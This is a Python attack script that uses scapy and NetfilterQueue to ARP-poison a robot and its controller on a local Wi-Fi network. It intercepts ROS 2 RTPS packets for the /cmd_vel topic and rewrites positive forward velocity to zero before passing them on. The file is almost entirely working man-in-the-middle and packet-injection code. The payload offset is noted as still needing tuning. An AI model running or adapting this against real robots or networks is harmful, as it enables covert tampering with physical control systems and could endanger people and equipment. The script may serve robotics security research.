from scapy.all import *
from netfilterqueue import NetfilterQueue
import threading
import time
import subprocess
import re
import struct

# --- SETTINGS ---
robot_ip = "192.168.0.194"
controller_ip = "192.168.0.16"
interface = "wlan0"
queue_number = 1

# ? Writer ID for /cmd_vel (0x00001103 ? little endian)
CMD_VEL_WRITER = b'\x03\x11\x00\x00'


# --- MAC RESOLUTION ---
def get_mac(ip):
    subprocess.run(["ping", "-c", "5", "-W", "2", ip],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    try:
        with open("/proc/net/arp") as f:
            for line in f:
                fields = line.split()
                if len(fields) >= 4 and fields[0] == ip:
                    mac = fields[3]
                    if mac != "00:00:00:00:00:00":
                        return mac
    except:
        pass

    try:
        result = subprocess.run(
            ["arping", "-I", interface, "-c", "5", "-w", "5", ip],
            capture_output=True, text=True
        )
        match = re.search(r'\[([0-9a-f:]{17})\]', result.stdout, re.IGNORECASE)
        if match:
            return match.group(1).lower()
    except:
        pass

    return None


# --- ARP SPOOFING ---
def spoof(target_ip, host_ip, target_mac):
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=host_ip
    )
    sendp(packet, iface=interface, verbose=False)


def arp_poison_thread(robot_mac, controller_mac):
    print("[*] ARP Poisoning Thread Active...")
    while True:
        spoof(robot_ip, controller_ip, robot_mac)
        spoof(controller_ip, robot_ip, controller_mac)
        time.sleep(2)


# --- PACKET PROCESSING ---
def process_packet(packet):
    scapy_pkt = IP(packet.get_payload())

    if scapy_pkt.haslayer(UDP) and scapy_pkt.haslayer(Raw):
        raw_data = scapy_pkt[Raw].load

        # Check RTPS
        if raw_data.startswith(b'RTPS'):

            # ? ONLY process /cmd_vel packets
            if CMD_VEL_WRITER not in raw_data:
                packet.accept()
                return

            print("[+] /cmd_vel packet detected")

            # --- FIND OFFSET (still needs tuning) ---
            target_offset = 64  # ?? update this once confirmed

            if len(raw_data) >= target_offset + 8:

                current_velocity = struct.unpack(
                    '<d',
                    raw_data[target_offset:target_offset+8]
                )[0]

                print(f"[!] Current velocity: {current_velocity}")

                # Modify forward motion
                if current_velocity > 0.0:
                    malicious_velocity = 0.0
                    malicious_bytes = struct.pack('<d', malicious_velocity)

                    new_payload = (
                        raw_data[:target_offset] +
                        malicious_bytes +
                        raw_data[target_offset+8:]
                    )

                    scapy_pkt[Raw].load = new_payload

                    # Recalculate checksums
                    del scapy_pkt[IP].len
                    del scapy_pkt[IP].chksum
                    del scapy_pkt[UDP].len
                    del scapy_pkt[UDP].chksum

                    packet.set_payload(bytes(scapy_pkt))

                    print("[*] Injected velocity: 0.0")

    packet.accept()


# --- MAIN ---
if __name__ == "__main__":
    print("[*] Starting interceptor...")

    robot_mac = get_mac(robot_ip)
    controller_mac = get_mac(controller_ip)

    if not robot_mac or not controller_mac:
        print("[!] Failed to get MACs")
        exit(1)

    print(f"Robot: {robot_ip} @ {robot_mac}")
    print(f"Controller: {controller_ip} @ {controller_mac}")

    arp_thread = threading.Thread(
        target=arp_poison_thread,
        args=(robot_mac, controller_mac),
        daemon=True
    )
    arp_thread.start()

    nfqueue = NetfilterQueue()
    nfqueue.bind(queue_number, process_packet)

    print(f"[*] Listening on NFQUEUE {queue_number}...")

    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print("[*] Stopping...")
        nfqueue.unbind()